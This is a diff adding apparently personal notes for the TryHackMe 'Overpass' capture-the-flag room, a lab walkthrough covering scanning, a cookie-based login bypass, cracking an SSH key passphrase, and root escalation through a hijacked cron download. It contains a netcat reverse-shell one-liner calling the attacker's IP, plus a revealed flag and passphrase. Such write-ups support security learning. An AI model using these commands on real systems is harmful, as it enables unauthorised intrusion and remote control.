@@ -1,0 +1,82 @@
+https://tryhackme.com/room/overpass
+
+Machine IP: 10.146.154.85
+Attack Machine: Kali VM on host machine with OpenVPN profile
+
+# commands
+## comments
+------------------------------------------------------------------------------------------------
+Q: Hack the machine and get the flag in user.txt
+A: thm{65c1aaf000506e56996822c6281e6bf7}
+
+# nmap -A -T5 10.146.154.85
+
+## We see a webpage and assume there will be some kind of admin login page
+# gobuster dir --wordlist /usr/share/wordlists/dirb/common.txt --url http://10.146.154.85
+
+## From their About Us page, they specifically mention being annoyed by too many passwords being used from the rockyou list, so must be something else
+## Let's inspect the page.
+## Submitting a bogus query while checking out the network tab points us in the direction of a login.js file.
+## In here, there is a chunk of code at the bottom which looks like our ticket in:
+## async function login() {
+##     const usernameBox = document.querySelector("#username");
+##     const passwordBox = document.querySelector("#password");
+##     const loginStatus = document.querySelector("#loginStatus");
+##     loginStatus.textContent = ""
+##     const creds = { username: usernameBox.value, password: passwordBox.value }
+##     const response = await postData("/api/login", creds)
+##     const statusOrCookie = await response.text()
+##     if (statusOrCookie === "Incorrect credentials") {
+##         loginStatus.textContent = "Incorrect Credentials"
+##         passwordBox.value=""
+##     } else {
+##         Cookies.set("SessionToken",statusOrCookie)
+##         window.location = "/admin"
+##     }
+## }
+
+## It looks like that if we add our own cookie with the tag "SessionCookie" and give it a proper response code, that should let us bypass
+
+## In the console on the webpage:
+# Cookies.set("SessionCookie",200)
+
+## Refresh the page and voila, now we have an RSA key ready to get us into the machine
+
+## Throw the contents of the key into a local file called rsa
+
+# ssh2john rsa > rsa.john
+# john --wordlist=/usr/share/wordlists/rockyou.txt rsa.john
+
+## Key pw is james13, now to login into the box
+
+# chmod 600 rsa
+# ssh james@10.146.154.85 -i rsa
+# cat user.txt
+
+Q: Escalate your privileges and get the flag in root.txt
+A: 
+
+## Since the build updates happen on a cadence, let's check the crontab entries
+# cat /etc/crontab
+
+## * * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
+## So the box pulls the script from this path and forwards it to a bash shell
+## Let's change that 'overpass.thm' to our machine and force it to upload a custom script that we can use!
+
+# nano /etc/hosts/
+# 192.168.138.43 overpass.thm <-- This was my VPN tunnel IP
+
+## Back on our machine, let's do two things, get a script built that matches the crontab's path and fire up a web server for the box to curl to
+# mkdir www && cd www
+# mkdir -p downloads/src/
+## Below script was found at PentestMonkey: https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+# echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.138.43 1234 >/tmp/f' > downloads/src/buildscript.sh
+# sudo python -m http.server 80
+
+## New terminal
+# nc -lvnp 1234
+
+## Now we wait for the script to get curl and the reverse shell to connect
+# whoami
+## root
+# cat /root/root.txt
